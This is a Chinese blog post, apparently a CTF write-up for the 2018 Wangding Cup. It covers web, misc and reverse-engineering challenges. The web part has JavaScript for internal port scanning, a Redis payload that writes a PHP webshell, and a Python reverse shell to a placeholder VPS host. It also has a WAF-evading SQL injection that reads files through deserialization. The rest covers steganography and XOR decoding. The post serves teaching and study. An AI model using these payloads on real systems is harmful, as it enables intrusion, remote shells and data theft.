<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />






<meta name="description" content="这比赛把人打到自闭">
<meta name="keywords">
<meta property="og:type" content="article">
<meta property="og:title" content="网鼎杯wp">
<meta property="og:url" content="http://Merl1ng.com/2018/08/20/网鼎杯wp/index.html">
<meta property="og:site_name" content="Merl1ng's blog">
<meta property="og:description" content="这比赛把人打到自闭">
<meta property="og:updated_time" content="2018-08-28T10:23:05.556Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="网鼎杯wp">
<meta name="twitter:description" content="这比赛把人打到自闭">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://Merl1ng.com/2018/08/20/网鼎杯wp/"/>





  <title>网鼎杯wp | Merl1ng's blog</title>
  














</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Merl1ng's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/08/20/网鼎杯wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Merl1ng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Merl1ng's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">网鼎杯wp</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-20T21:23:18+08:00">
                2018-08-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>这比赛把人打到自闭<br><a id="more"></a></p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1000"><a href="#web1000" class="headerlink" title="web1000"></a>web1000</h3><p>先写下这道没人做出来的web</p>
<p>题目本身出的非常好 行云流水般的内网操作</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzUzNTkyODI0OA==&amp;mid=2247491146&amp;idx=3&amp;sn=62911c7eede3f3207bd3badb65983d8d&amp;chksm=faff529dcd88db8b00fc09b58bd8d86ebbbd6463cba8d9319718e4ded7046fc60c76475aa943&amp;mpshare=1&amp;scene=23&amp;srcid=0820KKS4SsULFtWOy9z1xffV#rd</a></p>
<p><a href="https://xz.aliyun.com/t/2607" target="_blank" rel="external">https://xz.aliyun.com/t/2607</a></p>
<p><a href="https://www.xmsec.cc/wdb-review/" target="_blank" rel="external">https://www.xmsec.cc/wdb-review/</a></p>
<p>题目是一个在线爬虫解析HTML A标签的的功能，显示会把tag A的内容打印在屏幕上</p>
<p>首先扫目录 robots.txt</p>
<p>查看发现 目录  get_sourcecode</p>
<p>尝试访问 提示 NOT 127.0.0.1</p>
<p>所有头全加伪造一波 还是gg</p>
<p>namp看了下好像是nginx的反代</p>
<p>想到了长亭上那个代理题目的服务器 然后访问127.0.0.1的操作 仍然gg</p>
<p>大概是因为docker?? </p>
<p>这里应该测试爬虫 发现是动态分析 说白了就是会执行js</p>
<p>所以构造html文件 用 XMLHttpRequest  让 js 执行http请求</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">""</span> id=<span class="string">"flag"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line"></div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">loadXMLDoc</span></span>()</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">var xmlhttp;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (window.XMLHttpRequest)</div><div class="line"></div><div class="line">  &#123;// code <span class="keyword">for</span> IE7+, Firefox, Chrome, Opera, Safari</div><div class="line"></div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span></div><div class="line"></div><div class="line">  &#123;// code <span class="keyword">for</span> IE6, IE5</div><div class="line"></div><div class="line">  xmlhttp=new ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">xmlhttp.onreadystatechange=<span class="function"><span class="title">function</span></span>()</div><div class="line"></div><div class="line">  &#123;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line"></div><div class="line">    &#123;</div><div class="line"></div><div class="line">    document.getElementById(<span class="string">"flag"</span>).innerHTML=xmlhttp.responseText;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">  &#125;</div><div class="line"></div><div class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://127.0.0.1:80/get_sourcecode"</span>,<span class="literal">true</span>);</div><div class="line"></div><div class="line">xmlhttp.send();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">loadXMLDoc();</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>执行AJAX请求，并把结果动态赋到id为flag的a标签里，随之输出出来</p>
<p>AJAX 就是 异步的 JavaScript 和 XML</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">AJAX是基于现有的Internet标准</div><div class="line"></div><div class="line">AJAX是基于现有的Internet标准，并且联合使用它们：</div><div class="line"></div><div class="line">    XMLHttpRequest 对象 (异步的与服务器交换数据)</div><div class="line">    JavaScript/DOM (信息显示/交互)</div><div class="line">    CSS (给数据定义样式)</div><div class="line">    XML (作为转换数据的格式)</div><div class="line"></div><div class="line">AJAX应用程序与浏览器和平台无关的！</div></pre></td></tr></table></figure>
<p>这样终于拿到了源码</p>
<p>发现 <strong>过滤了dbfilename，可知是redis相关</strong></p>
<p>构造redis corntab shell失败，可能系统是ubuntu等，crontab不行就尝试从web入手<br>(由于redis写入的文件有莫名的头和尾 只有centos才能成功通过crontab来弹shell)</p>
<p><a href="http://foreversong.cn/archives/1180" target="_blank" rel="external">http://foreversong.cn/archives/1180</a></p>
<p>通过JS端口探测</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">&lt;a id=<span class="string">"result"</span>&gt;&lt;/a&gt;</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">var data = document.getElementById(<span class="string">'result'</span>).innerHTML;</div><div class="line"></div><div class="line">var TagName = document.getElementsByTagName(<span class="string">"body"</span>)[0];</div><div class="line"></div><div class="line">ports=[80,81,88,6379,8000,8080,8088];</div><div class="line"></div><div class="line"><span class="keyword">for</span>(var i <span class="keyword">in</span> ports)&#123;</div><div class="line"></div><div class="line">    var script =   document.createElement(<span class="string">"script"</span>);</div><div class="line"></div><div class="line">    poc = <span class="string">"data += '"</span>   + ports[i] + <span class="string">" OPEN; '; document.getElementById('result').innerHTML =   data;"</span></div><div class="line"></div><div class="line">      script.setAttribute(<span class="string">"src"</span>,<span class="string">"http://127.0.0.1:"</span> +   ports[i]);</div><div class="line"></div><div class="line">      script.setAttribute(<span class="string">"onload"</span>, poc);</div><div class="line"></div><div class="line">    TagName.appendChild(script);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>这里有个小坑，通过 JS 代码并不能发现 redis 的端口6379是开放的，但是该端口确实是开放的。有人说 JS 代码只能探测Web类端口，在探测redis端口的时候回卡在等待界面</p>
<p>getshell后可以发现CTF中redis环境是2.8版本。不过redis&gt;=3.2版本，会过滤一些特殊字符，直接利用js发送http请求，由于POST数据包的特殊字符被过滤，导致链接会被redis关闭，所以不会执行后面的写文件等payload</p>
<p>所以这里为什么还不清楚</p>
<p>得到8000端口开放着，猜测是apache2等phpserver</p>
<p>构造一个Redis EXP</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">""</span> id=<span class="string">"flag"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</div><div class="line">level=low_273eac1c</div><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">           var xmlHttp;</div><div class="line"></div><div class="line">           <span class="keyword">if</span>(window.XMLHttpRequest)&#123;</div><div class="line"></div><div class="line">                xmlHttp = new XMLHttpRequest();</div><div class="line"></div><div class="line">           &#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">          xmlHttp = newActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line"></div><div class="line">           &#125;</div><div class="line"></div><div class="line">           var formData = new FormData();</div><div class="line"></div><div class="line">   formData.append(<span class="string">"0"</span>,<span class="string">"flushall"</span>+<span class="string">"\n"</span>+<span class="string">"config set dir /var/www/html/"</span>+<span class="string">"\n"</span>+<span class="string">"config set dbfilename shell.php"</span>+<span class="string">"\n"</span>+<span class="string">'set 1 "\\n\\n&lt;?php header(\'</span>Access-Control-Allow-Origin:*\<span class="string">'); echo file_get_contents($_GET[0]);?&gt;\\n\\n"'</span>+<span class="string">"\n"</span>+<span class="string">"save"</span>+<span class="string">"\n"</span>+<span class="string">"quit"</span>);</div><div class="line"></div><div class="line">           xmlHttp.open(<span class="string">"POST"</span>,<span class="string">"http://127.0.0.1:6379"</span>,<span class="literal">true</span>);</div><div class="line"></div><div class="line">           xmlHttp.send(formData);</div><div class="line"></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>加 level=low_273eac1c 因为源码以有写过滤</p>
<p>这里有个坑点</p>
<p><strong>因为不同端口，所以存在跨域，需要加上Access-Control-Allow-Origin:* 头部 (CORS)</strong></p>
<p>有关同源和跨域<br><a href="https://www.cnblogs.com/rockmadman/p/6836834.html" target="_blank" rel="external">https://www.cnblogs.com/rockmadman/p/6836834.html</a></p>
<p>这里是盲打 你也不着写进去没 所以比赛时在不知道是不是正确时会很慌 无形增大难度</p>
<p>最后再构造一个HTML利用webshell</p>
<p><a href="" id="flag">test</a></p>
<script type="text/javascript">

function loadXMLDoc()

{

var xmlhttp;

if (window.XMLHttpRequest)

  {// code for IE7+, Firefox, Chrome, Opera, Safari

  xmlhttp=new XMLHttpRequest();

  }

else

  {// code for IE6, IE5

  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");

  }

xmlhttp.onreadystatechange=function()

  {

  if (xmlhttp.readyState==4 && xmlhttp.status==200)

    {

    document.getElementById("flag").innerHTML=xmlhttp.responseText;

    }

  }

xmlhttp.open("GET","http://127.0.0.1:8000/shell.php?0=flag.php",true);

xmlhttp.send();

}

loadXMLDoc();

</script>

<p>最后直接反弹shell也可以，大师傅测试的时候发现直接用bash反弹不行，但是用python代码可以反弹回来，可能是题目环境限制了一些关键词</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">""</span> id=<span class="string">"flag"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</div><div class="line">&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">loadXMLDoc</span></span>()&#123;</div><div class="line">    var xmlhttp;</div><div class="line">    <span class="keyword">if</span> (window.XMLHttpRequest)&#123;// code <span class="keyword">for</span> IE7+, Firefox, Chrome, Opera, Safari</div><div class="line">        xmlhttp=new XMLHttpRequest();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;// code <span class="keyword">for</span> IE6, IE5</div><div class="line">        xmlhttp=new ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line">    &#125;</div><div class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="title">function</span></span>()&#123;</div><div class="line">        <span class="keyword">if</span> (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</div><div class="line">        &#123;</div><div class="line">            document.getElementById(<span class="string">"flag"</span>).innerHTML=xmlhttp.responseText;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"http://127.0.0.1:8000/shell.php?_=`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"VPSIP\",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`;"</span>,<span class="literal">true</span>)</div><div class="line">    xmlhttp.send();</div><div class="line">&#125;</div><div class="line">loadXMLDoc();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>这题真的是十分精彩 其实做这个前几天我刚总结过 xss 打 内网redis 和 redis getshell 的相关操作</p>
<p>这次刚好加深印象 </p>
<p>不过这个可能不是传统回显在vps的xss 它那个在线爬虫会执行js并回显在当前页面 </p>
<p>大概可以说是ajax打内网 也有点像xml打内网 还有点像ssrf的操作</p>
<p>其实到底叫什么并不重要 真正要学习的是如何利用有限条件操作内网</p>
<h3 id="facebook"><a href="#facebook" class="headerlink" title="facebook"></a>facebook</h3><p>sql注入+反序列化+file协议读文件(LFR) 或者 sql注入+ssrf 只是思考的角度不同</p>
<p>不过对ssrf还是不太敏感 最近有在看hctf2016的题 AT Field 一开始也是ssrf 看wp的时候我还愣了一下<br><a href="http://www.freebuf.com/articles/web/121778.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/121778.html</a></p>
<p>同样扫目录  robots.txt</p>
<p>发现并下载user.php.bak</p>
<p>一看就应该有反序列化的洞</p>
<p>能看懂的反序列化学习<br><a href="https://www.cnblogs.com/perl6/p/7124345.html" target="_blank" rel="external">https://www.cnblogs.com/perl6/p/7124345.html</a></p>
<p>直接用 union select 会被WAF检测到，所以我们添加了 /**/</p>
<p><code>-1/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;yyy&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p>
<p>var/www/html/ 路径报错的时候给了 不给的话大概也能猜到</p>
<p>flag.php字典大的话可以跑出来 </p>
<p>为啥不直接http读flag.php</p>
<p>其实稍微试一下就能发现 http的协议也能得到base64的回显的 but只有flag.php没有base64的回显 应该是过滤了</p>
<p>使用http协议没办法读到flag 又给了文件路径 最简单的办法就是file协议</p>
<p>最后有一点sql注入时我感觉十分重要 <strong>就是回显位的判断</strong></p>
<p>?=-1或者加 and 1=2 让它自带语句不执行好回显我们的union是其一</p>
<p>还有你 union select 1,2,3,4 可能回显位只有一个 比如这题在 2 要是不仔细看下就得当盲注做了..</p>
<p>仍记得当时强网杯three hit那道sql没看回显位以为不能回显当盲注做的。。而且那道题还是二次注入当时脚本没写出来。。纯手工注入的。。。简直累死</p>
<p>那道题可以看<br><a href="https://blog.csdn.net/qq_32465127/article/details/79814049" target="_blank" rel="external">https://blog.csdn.net/qq_32465127/article/details/79814049</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="minifie"><a href="#minifie" class="headerlink" title="minifie"></a>minifie</h3><p>png隐写 看图片我还以为要python提取像素点</p>
<p>正解为stegsolve发现red0通道为空</p>
<p>猜测是0通道有问题，将其他plane 0通道（red，green，Alpha）提取并且保存，使用Stegsolve对三张图片分别做Image Combiner对比 ，最后发现Alpha plane 0和green plane 0通道进行XOR（异或） 就可以得到flag</p>
<p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81870097" target="_blank" rel="external">https://blog.csdn.net/xiangshangbashaonian/article/details/81870097</a></p>
<h3 id="clip"><a href="#clip" class="headerlink" title="clip"></a>clip</h3><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/81906161" target="_blank" rel="external">https://blog.csdn.net/xiangshangbashaonian/article/details/81906161</a></p>
<p>这题被题目描述坑了 说什么从老旧损坏硬盘恢复的文件系统</p>
<p>我一直试文件恢复的操作。。</p>
<p>结果是winhex直接搜索</p>
<p>有师傅说disk是应该linux挂载的 但既然提示损坏就应该不是这个方向 有点牵强orz</p>
<p>结果从文件中可以搜索到两个png图片 注意有一个是没有png文件头的 </p>
<p>这里最搜索 <strong>IDAT</strong> 涨姿势了orz</p>
<p><a href="https://blog.csdn.net/SWEET0SWAT/article/details/81879942" target="_blank" rel="external">https://blog.csdn.net/SWEET0SWAT/article/details/81879942</a></p>
<p>但这种做法好像不是预期 预期可能是什么zlib compress解密</p>
<p>当时我 binwalk -e能出来超级多的zlib 然后我就不会了。。</p>
<h2 id="记录一道re"><a href="#记录一道re" class="headerlink" title="记录一道re"></a>记录一道re</h2><p><a href="https://paper.tuisec.win/detail/f8d629ce47c117c" target="_blank" rel="external">https://paper.tuisec.win/detail/f8d629ce47c117c</a></p>
<p>为啥想记录这道re呢 因为看wp把我吓到了 大师傅直接就能看出来字符串是xor的。。膜拜</p>
<p>贴下原话</p>
<p>老年misc选手,看到输出得到加密后的flag:4b404c4b5648725b445845734c735949405c414d5949725c45495a51<br>像是异或flag后的结果</p>
<p>import libnum<br>In [97]: libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51)<br>Out[97]: ‘K@LKVHr[DXEsLsYI@\AMYIr\EIZQ’</p>
<p>猜测:<br>In [93]: ord(“f”)^0x4b<br>Out[93]: 45</p>
<p>In [94]: ord(“g”)^0x4b<br>Out[94]: 44</p>
<p>In [95]: ord(“l”)^0x40<br>Out[95]: 44</p>
<p>In [96]: ord(“a”)^0x4c<br>Out[96]: 45</p>
<p>xor key 为45,44</p>
<p>In [98]: enc = libnum.n2s(0x4b404c4b5648725b445845734c735949405c414d5949725c45495a51)</p>
<p>In [99]: flag = “”<br>In [102]: for i in range(len(enc)):<br>     …:     if i%2==0:<br>     …:         flag+=chr(ord(enc[i])^45)<br>     …:     else:<br>     …:         flag+=chr(ord(enc[i])^44)<br>     …:<br>     …:         </p>
<p>In [103]: print flag<br>flag{d_with_a_template_phew}</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/08/24/网鼎杯第二场wp/" rel="next" title="网鼎杯第二场wp">
                <i class="fa fa-chevron-left"></i> 网鼎杯第二场wp
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/08/18/sqlbypass小结/" rel="prev" title="sqlbypass小结">
                sqlbypass小结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            Overview
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/avatar.gif"
               alt="Merl1ng" />
          <p class="site-author-name" itemprop="name">Merl1ng</p>
           
              <p class="site-description motion-element" itemprop="description">Love life , love gakki !</p>
          
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
              <a href="/archives/">
                <span class="site-state-item-count">79</span>
                <span class="site-state-item-name">posts</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">7</span>
                <span class="site-state-item-name">categories</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">24</span>
                <span class="site-state-item-name">tags</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Merl1ng" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                  GitHub
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="https://twitter.com/Merl1ng" target="_blank" title="Twitter">
                  
                    <i class="fa fa-fw fa-twitter"></i>
                  
                  Twitter
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web1000"><span class="nav-number">1.1.</span> <span class="nav-text">web1000</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.1.1.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#facebook"><span class="nav-number">1.2.</span> <span class="nav-text">facebook</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#minifie"><span class="nav-number">2.1.</span> <span class="nav-text">minifie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#clip"><span class="nav-number">2.2.</span> <span class="nav-text">clip</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#记录一道re"><span class="nav-number">3.</span> <span class="nav-text">记录一道re</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Merl1ng</span>
</div>


<div class="powered-by">
   Love life 
</div>

<div class="theme-info">
  Love gakki 
  
</div>


        

        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
